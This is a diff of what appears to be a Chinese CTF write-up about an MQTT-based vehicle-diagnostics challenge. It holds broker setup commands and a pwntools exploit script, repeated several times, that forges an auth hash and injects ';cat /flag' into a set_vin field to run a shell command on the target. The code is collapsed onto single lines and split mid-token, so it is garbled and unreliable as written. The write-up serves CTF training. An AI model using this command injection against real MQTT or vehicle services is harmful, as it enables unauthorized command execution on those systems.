@@ -27,7 +27,17 @@ listener 9999 #设置监听端口为 9999allow_anonymous true  # 可选，允
 
 题目复盘
 
-#! /usr/bin/python3import randomfrom pwn import *import timeimport paho.mqtt.client as mqttimport jsoncontext(log_level = "debug",os = "linux",arch = "amd64")pwnFile = "./pwn"libcFile = "./libc.so.6"ip = "127.0.0.1"local = ""local_port = 9999port = 9999elf = ELF(pwnFile)libc = ELF(libcFile)def debug(value):    if value==1:        io = process(pwnFile)    else:        io = remote(ip,port)    return iodef dbg(msg=""):    gdb.attach(io,msg)def publish(client,topic,auth,cmd,arg):    msg = {        "auth":auth,        "cmd":cmd,        "arg":arg    }    result = client.publish(topic = topic, payload = json.dumps(msg))    print(json.dumps(msg))    print(result)    return resultdef on_connect(client, userdata, flags, rc):    client.subscribe("vehicle_diag")    client.subscribe("diag")    client.subscribe("#")  # 订阅所有    client.subscribe("diag/resp")    print("Connected with result code " + str(rc))def on_subscribe(client,userdata,mid,granted_qos):    print("消息发送成功")def on_message(client, userdata, msg):    message = msg.payload.decode()# Decode message payload    print(f"Received message on topic '{msg.topic}': {message}")    # try:    #     data = json.loads(message)  # 解析为字典    #     dest = data.get("vin")  # 获取vin字段    #     log.success("dest -> "+ dest)    # except json.JSONDecodeError:    #     print("JSON解析失败")    print(message)def sum2hex(dest):    v3 = 0    for i in range(len(dest)):        v3 = (0x1f  * v3 +  ord(dest[i])) & 0xffffffff    log.success(f"sum2hex -> {v3:08x}")    return  f"{v3:08x}"io = debug(0)#gdb.attach(io,'b *$rebase(0x1EC0)')topic = "diag"client = mqtt.Client()client.on_connect = on_connectclient.on_message = on_messageclient.on_subscribe = on_subscribeclient.connect(host = "127.0.0.1",port = 9999,keepalive=10000)   auth = sum2hex("test")publish(client,"diag",auth,"set_vin","111111111111")sleep(0.5)publish(client,"diag",auth,"set_vin",";cat /flag")publish(client,"diag",auth,"set_vin",";cat /flag")sleep(1)client.loop_start()io.interactive()
+#! /usr/bin/python3import random
+from pwn import *import timeimport paho.mqtt.client as mqttimport jsoncontext(log_level = "debug",os = "linux",arch = "amd64")pwnFile = "./pwn"libcFile = "./libc.so.6"ip = "127.0.0.1"local = ""local_port = 9999port = 9999elf = ELF(pwnFile)libc = ELF(libcFile)def debug(value):    if value==1:        io = process(pwnFile)    else:        io = remote(ip,port)    return io
+def dbg(msg=""):    gdb.attach(io,msg)def publish(client,topic,auth,cmd,arg):    msg = {        "auth":
+auth,        "cmd":
+cmd,        "arg":
+arg    }    result = client.publish(topic = topic, payload = json.dumps(msg))    print(json.dumps(msg))    print(result)    return result
+def on_connect(client, userdata, flags, rc):    client.subscribe("vehicle_diag")    client.subscribe("diag")    client.subscribe("#")  # 订阅所有    client.subscribe("diag/resp")    print("Connected with result code " + str(rc))def on_subscribe(client,userdata,mid,granted_qos):    print("消息发送成功")def on_message(client, userdata, msg):    message = msg.payload.decode()
+# Decode message payload    print(f"Received message on topic '{msg.topic}': {message}")    # try:    #     data = json.loads(message)  # 解析为字典    #     dest = data.get("vin")  # 获取vin字段    #     log.success("dest -> "+ dest)    # 
+except json.JSONDecodeError:    #     print("JSON解析失败")    print(message)def sum2hex(dest):    v3 = 0    for i in range(len(dest)):        v3 = (0x1f  * v3 +  ord(dest[i])) & 0xffffffff    log.success(f"sum2hex -> {v3:
+08x}")    return  f"{v3:
+08x}"io = debug(0)#gdb.attach(io,'b *$rebase(0x1EC0)')topic = "diag"client = mqtt.Client()client.on_connect = on_connectclient.on_message = on_messageclient.on_subscribe = on_subscribeclient.connect(host = "127.0.0.1",port = 9999,keepalive=10000)   auth = sum2hex("test")publish(client,"diag",auth,"set_vin","111111111111")sleep(0.5)publish(client,"diag",auth,"set_vin",";cat /flag")publish(client,"diag",auth,"set_vin",";cat /flag")sleep(1)client.loop_start()io.interactive()
 
 4
 
@@ -64,42 +74,22 @@ House of Einherjar
 
 ```
 sudo apt updatesudo apt install mosquitto mosquitto-clients
-```
-
-
-
-```
 sudo systemctl enable mosquittosudo systemctl start mosquitto
-```
-
-
-
-```
 mosquitto_sub -h localhost -t test/topic
-```
-
-
-
-```
 mosquitto_pub -h localhost -t test/topic -m "Hello MQTT"
-```
-
-
-
-```
 sudo vim /etc/mosquitto/mosquitto.conf
-```
-
-
-
-```
 listener 9999 #设置监听端口为 9999allow_anonymous true  # 可选，允许匿名访问（默认）sudo systemctl restart mosquitto # 重启服务
-```
-
-
-
-```
-#! /usr/bin/python3import randomfrom pwn import *import timeimport paho.mqtt.client as mqttimport jsoncontext(log_level = "debug",os = "linux",arch = "amd64")pwnFile = "./pwn"libcFile = "./libc.so.6"ip = "127.0.0.1"local = ""local_port = 9999port = 9999elf = ELF(pwnFile)libc = ELF(libcFile)def debug(value):    if value==1:        io = process(pwnFile)    else:        io = remote(ip,port)    return iodef dbg(msg=""):    gdb.attach(io,msg)def publish(client,topic,auth,cmd,arg):    msg = {        "auth":auth,        "cmd":cmd,        "arg":arg    }    result = client.publish(topic = topic, payload = json.dumps(msg))    print(json.dumps(msg))    print(result)    return resultdef on_connect(client, userdata, flags, rc):    client.subscribe("vehicle_diag")    client.subscribe("diag")    client.subscribe("#")  # 订阅所有    client.subscribe("diag/resp")    print("Connected with result code " + str(rc))def on_subscribe(client,userdata,mid,granted_qos):    print("消息发送成功")def on_message(client, userdata, msg):    message = msg.payload.decode()# Decode message payload    print(f"Received message on topic '{msg.topic}': {message}")    # try:    #     data = json.loads(message)  # 解析为字典    #     dest = data.get("vin")  # 获取vin字段    #     log.success("dest -> "+ dest)    # except json.JSONDecodeError:    #     print("JSON解析失败")    print(message)def sum2hex(dest):    v3 = 0    for i in range(len(dest)):        v3 = (0x1f  * v3 +  ord(dest[i])) & 0xffffffff    log.success(f"sum2hex -> {v3:08x}")    return  f"{v3:08x}"io = debug(0)#gdb.attach(io,'b *$rebase(0x1EC0)')topic = "diag"client = mqtt.Client()client.on_connect = on_connectclient.on_message = on_messageclient.on_subscribe = on_subscribeclient.connect(host = "127.0.0.1",port = 9999,keepalive=10000)   auth = sum2hex("test")publish(client,"diag",auth,"set_vin","111111111111")sleep(0.5)publish(client,"diag",auth,"set_vin",";cat /flag")publish(client,"diag",auth,"set_vin",";cat /flag")sleep(1)client.loop_start()io.interactive()
+#! /usr/bin/python3import random
+from pwn import *import timeimport paho.mqtt.client as mqttimport jsoncontext(log_level = "debug",os = "linux",arch = "amd64")pwnFile = "./pwn"libcFile = "./libc.so.6"ip = "127.0.0.1"local = ""local_port = 9999port = 9999elf = ELF(pwnFile)libc = ELF(libcFile)def debug(value):    if value==1:        io = process(pwnFile)    else:        io = remote(ip,port)    return io
+def dbg(msg=""):    gdb.attach(io,msg)def publish(client,topic,auth,cmd,arg):    msg = {        "auth":
+auth,        "cmd":
+cmd,        "arg":
+arg    }    result = client.publish(topic = topic, payload = json.dumps(msg))    print(json.dumps(msg))    print(result)    return result
+def on_connect(client, userdata, flags, rc):    client.subscribe("vehicle_diag")    client.subscribe("diag")    client.subscribe("#")  # 订阅所有    client.subscribe("diag/resp")    print("Connected with result code " + str(rc))def on_subscribe(client,userdata,mid,granted_qos):    print("消息发送成功")def on_message(client, userdata, msg):    message = msg.payload.decode()
+# Decode message payload    print(f"Received message on topic '{msg.topic}': {message}")    # try:    #     data = json.loads(message)  # 解析为字典    #     dest = data.get("vin")  # 获取vin字段    #     log.success("dest -> "+ dest)    # 
+except json.JSONDecodeError:    #     print("JSON解析失败")    print(message)def sum2hex(dest):    v3 = 0    for i in range(len(dest)):        v3 = (0x1f  * v3 +  ord(dest[i])) & 0xffffffff    log.success(f"sum2hex -> {v3:
+08x}")    return  f"{v3:
+08x}"io = debug(0)#gdb.attach(io,'b *$rebase(0x1EC0)')topic = "diag"client = mqtt.Client()client.on_connect = on_connectclient.on_message = on_messageclient.on_subscribe = on_subscribeclient.connect(host = "127.0.0.1",port = 9999,keepalive=10000)   auth = sum2hex("test")publish(client,"diag",auth,"set_vin","111111111111")sleep(0.5)publish(client,"diag",auth,"set_vin",";cat /flag")publish(client,"diag",auth,"set_vin",";cat /flag")sleep(1)client.loop_start()io.interactive()
 ```
 
 
